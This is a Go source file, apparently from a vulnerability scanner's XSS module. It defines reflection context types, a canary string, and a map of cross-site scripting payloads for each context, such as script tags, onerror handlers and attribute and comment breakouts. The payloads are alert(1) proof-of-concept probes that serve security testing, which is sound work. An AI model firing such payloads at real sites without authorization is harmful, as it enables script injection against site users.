package xss

// ContextType represents the type of XSS context where reflection was found
type ContextType int

const (
	// ContextNone indicates no reflection was found
	ContextNone ContextType = iota
	// ContextHTMLText indicates reflection in HTML text content
	ContextHTMLText
	// ContextAttribute indicates reflection in an HTML attribute value (quoted)
	ContextAttribute
	// ContextAttributeUnquoted indicates reflection in an unquoted HTML attribute value
	ContextAttributeUnquoted
	// ContextScript indicates reflection inside a script block (executable JS context)
	ContextScript
	// ContextScriptString indicates reflection inside a JS string within a script block
	ContextScriptString
	// ContextScriptURI indicates reflection inside a javascript: URI (e.g., href="javascript:...")
	ContextScriptURI
	// ContextStyle indicates reflection inside a style block
	ContextStyle
	// ContextHTMLComment indicates reflection inside an HTML comment
	ContextHTMLComment
	// ContextJSONScript indicates reflection inside a JSON script block (non-executable)
	ContextJSONScript
)

func (c ContextType) String() string {
	switch c {
	case ContextNone:
		return "none"
	case ContextHTMLText:
		return "html_text"
	case ContextAttribute:
		return "attribute"
	case ContextAttributeUnquoted:
		return "attribute_unquoted"
	case ContextScript:
		return "script"
	case ContextScriptString:
		return "script_string"
	case ContextScriptURI:
		return "script_uri"
	case ContextStyle:
		return "style"
	case ContextHTMLComment:
		return "html_comment"
	case ContextJSONScript:
		return "json_script"
	default:
		return "unknown"
	}
}

// XSSCanary is the canary string injected to detect reflection context
const XSSCanary = "nucleiXSScanary</>\"'"

// XSCPayloads are context-appropriate XSS payloads
var XSCPayloads = map[ContextType][]string{
	ContextHTMLText: {
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
	},
	ContextAttribute: {
		"\" onmouseover=alert(1) \"",
		"\" onfocus=alert(1) autofocus=\"",
		"'><script>alert(1)</script>",
	},
	ContextAttributeUnquoted: {
		" onmouseover=alert(1) ",
		" onclick=alert(1) ",
	},
	ContextScript: {
		"</script><script>alert(1)</script>",
		";alert(1)//",
	},
	ContextScriptString: {
		"';alert(1)//",
		"\";alert(1)//",
		"</script><script>alert(1)</script>",
	},
	ContextScriptURI: {
		"alert(1)//",
		"javascript:alert(1)",
	},
	ContextStyle: {
		"</style><script>alert(1)</script>",
		"expression(alert(1))",
	},
	ContextHTMLComment: {
		"--><script>alert(1)</script>",
		"--!><script>alert(1)</script>",
	},
	// JSONScript: no payloads since it's not an executable context
	// (reflections here are false positives for XSS)
}
